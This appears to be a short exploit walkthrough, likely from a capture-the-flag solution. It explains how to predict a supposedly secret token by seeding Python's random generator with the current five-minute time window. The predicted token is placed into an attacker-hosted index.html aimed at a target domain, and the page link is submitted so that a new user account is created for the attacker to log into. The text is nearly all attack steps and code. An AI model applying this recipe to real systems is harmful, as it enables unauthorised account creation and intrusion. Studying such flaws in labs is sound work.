1. Modify the domain name in the index.html file to match the target.
2. Run the following python commands and add fiveMinToken to the index.html file as the token value
    ```
    import random
    import time
    rd = random.Random()
    rd.seed(int(time.time()/300))
    fiveMinToken = rd.getrandbits(128)
    ```
3. Submit a link to your web server and login with the newly created user
